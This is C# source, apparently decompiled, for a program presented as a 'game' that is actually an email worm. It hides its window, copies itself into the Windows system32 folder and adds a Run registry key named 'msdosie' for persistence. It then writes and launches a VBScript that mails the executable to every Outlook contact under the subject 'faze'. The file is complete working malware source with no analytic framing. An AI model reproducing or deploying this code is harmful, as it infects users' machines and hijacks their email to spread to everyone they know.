using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace game;

public class Form1 : Form
{
	private Container components = null;

	private RegistryKey key = Registry.LocalMachine;

	private RegistryKey key1;

	public Form1()
	{
		InitializeComponent();
		try
		{
			if (!File.Exists("c:\\WINNT\\system32\\game.exe"))
			{
				string sourceFileName = Directory.GetCurrentDirectory() + "\\game.exe";
				string destFileName = "c:\\WINNT\\system32\\game.exe";
				File.Copy(sourceFileName, destFileName, overwrite: true);
				key1 = key.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
				key1.SetValue("msdosie", "c:\\WINNT\\system32\\game.exe");
				key1.Close();
			}
			FileStream fileStream = new FileStream("c:\\WINNT\\system32\\mail.vbs", FileMode.Create, FileAccess.Write, FileShare.Write);
			StreamWriter streamWriter = new StreamWriter(fileStream);
			streamWriter.WriteLine("'On Error Resume Next");
			streamWriter.WriteLine("Set objOA=Wscript.CreateObject(\"Outlook.Application\")");
			streamWriter.WriteLine("Set objMapi=objOA.GetNameSpace(\"MAPI\")");
			streamWriter.WriteLine("For i=1 to objMapi.AddressLists.Count");
			streamWriter.WriteLine("Set objAddList=objMapi.AddressLists(i)");
			streamWriter.WriteLine("For j=1 To objAddList. AddressEntries.Count");
			streamWriter.WriteLine("Set objMail=objOA.CreateItem(0)");
			streamWriter.WriteLine("objMail.Recipients.Add objAddList.AddressEntries(j)");
			streamWriter.WriteLine("objMail.Subject=\"faze\"");
			streamWriter.WriteLine("objMail.Body=\"How are you today?\"");
			streamWriter.WriteLine("objMail.Attachments.Add \"c:\\WINNT\\system32\\game.exe\"");
			streamWriter.WriteLine("objMail.Send");
			streamWriter.WriteLine("Next");
			streamWriter.WriteLine("Next");
			streamWriter.WriteLine("Set objMapi=Nothing");
			streamWriter.WriteLine("Set objOA=Nothing");
			streamWriter.Flush();
			streamWriter.Close();
			fileStream.Close();
			Process.Start("c:\\WINNT\\system32\\mail.vbs");
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Form)this).set_AutoScaleBaseSize(new Size(6, 14));
		((Form)this).set_ClientSize(new Size(292, 273));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
	}

	[STAThread]
	private static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}
}
